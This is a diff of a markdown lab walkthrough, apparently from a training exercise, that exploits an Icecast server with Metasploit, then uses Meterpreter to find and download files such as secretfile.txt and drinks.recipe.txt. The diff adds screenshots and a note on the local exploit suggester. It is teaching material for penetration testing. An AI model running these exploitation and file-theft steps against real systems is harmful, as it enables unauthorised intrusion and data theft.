@@ -20,11 +20,19 @@ Run the SearchSploit commands to show available Icecast exploits.
 
 command: searchsploit icecast
 
+![searchsploit](https://user-images.githubusercontent.com/81331968/117707965-761bc000-b18c-11eb-8ee1-3269e14076ff.png)
+
+
 Now that we know which exploits are available to us, let's start Metasploit:
 
 Run the command that starts Metasploit:
 
 command: msfconsole
+
+
+
+![msf5](https://user-images.githubusercontent.com/81331968/117707983-7b790a80-b18c-11eb-90f7-06fd6ffe00f9.png)
+
 
 
 Search for the Icecast module and load it for use.
@@ -41,6 +49,11 @@ Run the command that sets the RHOST:
 
 Command: set rhosts 192.168.0.20
 
+
+
+![set rhots](https://user-images.githubusercontent.com/81331968/117710271-2985b400-b18f-11eb-98e2-22edd46cd2f4.png)
+
+
 Run the Icecast exploit.
 
 Run the command that runs the Icecast exploit.
@@ -50,6 +63,9 @@ command: exploit
 Run the command that performs a search for the secretfile.txt on the target.
 
 command: search -f secretfile*.txt
+
+![secret file](https://user-images.githubusercontent.com/81331968/117710360-43bf9200-b18f-11eb-9fc7-ee5432f876cb.png)
+
 
 Download drinks.recipe.txt
 
@@ -64,8 +80,11 @@ Run the command to performs a search for the recipe.txt on the target:
 
 ![screenshot 2 meterpreter](https://user-images.githubusercontent.com/81331968/117706919-1f61b680-b18b-11eb-8853-12bf9a25a4a4.png)
 
+You can also use Meterpreter's local exploit suggester to find possible exploits.
+Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
-![screenshot 4](https://user-images.githubusercontent.com/81331968/117707011-3dc7b200-b18b-11eb-966e-f4f72834c368.png)
+![meterpreter](https://user-images.githubusercontent.com/81331968/117710528-736e9a00-b18f-11eb-864c-fe81197283e0.png)
+
 
 
 
